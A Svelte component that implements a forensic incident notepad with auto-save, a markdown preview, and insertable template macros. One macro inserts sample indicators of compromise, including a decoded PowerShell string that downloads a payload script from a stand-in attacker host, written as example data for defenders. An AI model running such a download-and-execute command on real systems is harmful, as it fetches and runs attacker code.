<script lang="ts">
  import { onDestroy } from 'svelte';
  import type { CaseNote, TimelineEvent } from '../types';
  import { 
    FileEdit, 
    FileCheck, 
    RefreshCw, 
    BookmarkPlus, 
    Heading3, 
    ClipboardList 
  } from 'lucide-svelte';

  // Svelte 5 props
  const { 
    caseId, 
    notes, 
    caseEvents = [], 
    onSaveNotes 
  } = $props();

  let content = $state(notes?.content || "");
  let activeTab = $state<"write" | "preview">("write");
  let isSaving = $state(false);

  let saveTimeout: ReturnType<typeof setTimeout> | null = null;
  let lastSyncedCaseId: string | null = null;

  // React to change of caseId or notes from parent
  $effect(() => {
    if (notes && lastSyncedCaseId !== caseId) {
      content = notes.content || "";
      lastSyncedCaseId = caseId;
    }
  });

  // Handle typing auto-save triggers with debounce
  function handleContentChange(val: string) {
    content = val;
    isSaving = true;

    if (saveTimeout) {
      clearTimeout(saveTimeout);
    }

    saveTimeout = setTimeout(() => {
      onSaveNotes(val);
      isSaving = false;
    }, 1200); // 1.2 second debounce
  }

  // Safe cleanup - immediately saves pending changes on destroy
  onDestroy(() => {
    if (saveTimeout) {
      clearTimeout(saveTimeout);
      onSaveNotes(content);
    }
  });

  function selectMacroInjection(type: string) {
    let injectionText = "";
    if (type === "mitigation") {
      injectionText = `\n### 🛡️ Recommended Mitigations Checklist:\n- [ ] Rotate compromised user VPN session keys immediately.\n- [ ] Block host outgoing egress traffic targeting external cloud storage IP space.\n- [ ] Enforce conditional domain group access rules.`;
    } else if (type === "ioc") {
      injectionText = `\n### 🧬 Identified Indicators of Compromise (IoC):\n- **IP Space**: VPN Proxy ingress (origin: residential proxy block)\n- **Host Binaries**: C:\\Users\\Public\\Downloads\\network_scan.exe\n- **Decoded Command String**: \`DownloadString('http://attacker.xyz/payload.ps1')\``;
    } else if (type === "events") {
      const formattedEvents = caseEvents.map(e => `* **[${e.timestamp.substring(11, 16) || e.timestamp}]** ${e.event} (${e.severity})`).join("\n");
      injectionText = `\n### 📅 Chronological Sequence Map:\n${formattedEvents || "*No events mapped yes.*"}`;
    }

    const newContent = content + injectionText;
    handleContentChange(newContent);
  }

  // Super lightweight Markdown renderer to support basic styling (bold, header, bullet lists, code) safely without compiling issues
  function renderSimpleMarkdown(text: string) {
    if (!text) return [];

    const lines = text.split("\n");
    return lines.map((line) => {
      // Headers
      if (line.startsWith("# ")) {
        return { type: "h1", text: line.replace("# ", "") };
      }
      if (line.startsWith("## ")) {
        return { type: "h2", text: line.replace("## ", "") };
      }
      if (line.startsWith("### ")) {
        return { type: "h3", text: line.replace("### ", "") };
      }
      // Bullet list item
      if (line.startsWith("- [ ] ") || line.startsWith("- [x] ")) {
        const checked = line.startsWith("- [x]");
        return { type: "todo", checked, text: line.substring(6) };
      }
      if (line.startsWith("- ") || line.startsWith("* ")) {
        return { type: "li", text: line.substring(2) };
      }
      // Trigger bold and backticks
      if (line.includes("**")) {
        const parts = line.split("**");
        const segments = parts.map((part, pIdx) => ({
          bold: pIdx % 2 === 1,
          text: part
        }));
        return { type: "p-segments", segments };
      }

      // Default line paragraph
      return { type: "p", text: line };
    });
  }

  const renderedLines = $derived(renderSimpleMarkdown(content));
</script>

<div class="space-y-4">
  <div class="flex items-center justify-between border-b border-slate-100 pb-2">
    <h4 class="text-[12px] uppercase tracking-wider font-extrabold text-slate-400 flex items-center gap-1.5">
      <FileEdit class="h-4 w-4 text-violet-500" /> Forensic Log Notepad
    </h4>
    
    <!-- Saving State and Tab bar -->
    <div class="flex items-center gap-2">
      <span class="text-[10px] font-mono text-slate-400 flex items-center gap-1">
        {#if isSaving}
          <RefreshCw class="h-3 w-3 animate-spin text-violet-500" /> Auto-saving...
        {:else}
          <FileCheck class="h-3 w-3 text-emerald-500" /> Auto-saved
        {/if}
      </span>
      
      <div class="flex bg-slate-100 rounded-lg p-0.5 text-[10.5px] font-bold border border-slate-200">
        <button
          id="tab-note-write"
          onclick={() => activeTab = "write"}
          class="px-3 py-1 rounded-md transition-all border-none cursor-pointer {
            activeTab === 'write' ? 'bg-white text-slate-800 shadow-sm' : 'text-slate-400 hover:text-slate-600 bg-transparent'
          }"
        >
          Write
        </button>
        <button
          id="tab-note-preview"
          onclick={() => activeTab = "preview"}
          class="px-3 py-1 rounded-md transition-all border-none cursor-pointer {
            activeTab === 'preview' ? 'bg-white text-slate-800 shadow-sm' : 'text-slate-400 hover:text-slate-600 bg-transparent'
          }"
        >
          Preview
        </button>
      </div>
    </div>
  </div>

  <!-- Editor Panel Block -->
  {#if activeTab === "write"}
    <div id="notes-write-block" class="space-y-3">
      <textarea
        id="notes-textarea-input"
        value={content}
        oninput={(e) => handleContentChange((e.target as HTMLTextAreaElement).value)}
        placeholder="# Active Workstation Incident Log..."
        class="w-full h-80 text-xs font-mono p-4 border border-slate-200 rounded-2xl focus:outline-none focus:ring-1 focus:ring-violet-500 bg-white shadow-inner resize-none leading-relaxed"
      ></textarea>

      <!-- Quick Macro Templates bar -->
      <div class="space-y-1.5 pt-1">
        <span class="text-[10.5px] font-bold text-slate-400 uppercase tracking-widest block mb-1">Incorporate Template Macros:</span>
        <div class="flex flex-wrap gap-2 text-[10px] font-bold">
          <button
            id="macro-mitigation-inject"
            onclick={() => selectMacroInjection("mitigation")}
            class="px-2.5 py-1.5 bg-violet-100/60 hover:bg-violet-100 text-violet-700 rounded-lg border border-violet-200/50 transition-colors flex items-center gap-1 cursor-pointer"
          >
            <BookmarkPlus class="h-3 w-3" /> Mitigations Checklist
          </button>
          <button
            id="macro-ioc-inject"
            onclick={() => selectMacroInjection("ioc")}
            class="px-2.5 py-1.5 bg-amber-50 hover:bg-amber-100 text-amber-700 rounded-lg border border-amber-200/50 transition-colors flex items-center gap-1 cursor-pointer"
          >
            <Heading3 class="h-3 w-3" /> Indicators of Compromise
          </button>
          <button
            id="macro-events-inject"
            onclick={() => selectMacroInjection("events")}
            class="px-2.5 py-1.5 bg-emerald-50 hover:bg-emerald-100 text-emerald-800 rounded-lg border border-emerald-200/50 transition-colors flex items-center gap-1 cursor-pointer"
          >
            <ClipboardList class="h-3 w-3" /> Sequence Map
          </button>
        </div>
      </div>
    </div>
  {:else}
    <div 
      id="notes-preview-block" 
      class="w-full h-96 overflow-y-auto p-5 border border-slate-200 rounded-2xl bg-white leading-relaxed space-y-2 select-text"
    >
      {#if renderedLines.length === 0}
        <p class="text-slate-400 italic text-xs">No notes created yet. Select 'Write' tag to compile investigation details.</p>
      {:else}
        {#each renderedLines as item}
          {#if item.type === "h1"}
            <h1 class="text-xl font-extrabold text-slate-900 border-b border-slate-200 pb-2.5 mt-5 mb-3 font-sans">{item.text}</h1>
          {:else}
            {#if item.type === "h2"}
              <h2 class="text-base font-bold text-slate-800 mt-4 mb-2 font-sans">{item.text}</h2>
            {:else if item.type === "h3"}
              <h3 class="text-sm font-extrabold text-slate-700 mt-3 mb-1.5 font-sans">{item.text}</h3>
            {:else if item.type === "todo"}
              <div class="flex items-center gap-2 text-xs text-slate-600 my-1">
                <input type="checkbox" checked={item.checked} disabled class="rounded border-slate-300 text-violet-600 focus:ring-violet-500" />
                <span class={item.checked ? "line-through text-slate-400" : ""}>{item.text}</span>
              </div>
            {:else if item.type === "li"}
              <li class="text-xs text-slate-600 ml-4 list-disc my-1">{item.text}</li>
            {:else if item.type === "p-segments"}
              <p class="text-xs text-slate-600 leading-relaxed min-h-[1rem] my-1">
                {#each item.segments as segment}
                  {#if segment.bold}
                    <strong class="font-extrabold text-[#111827]">{segment.text}</strong>
                  {:else}
                    {segment.text}
                  {/if}
                {/each}
              </p>
            {:else}
              <p class="text-xs text-slate-600 leading-relaxed min-h-[1rem] my-1">{item.text}</p>
            {/if}
          {/if}
        {/each}
      {/if}
    </div>
  {/if}
</div>
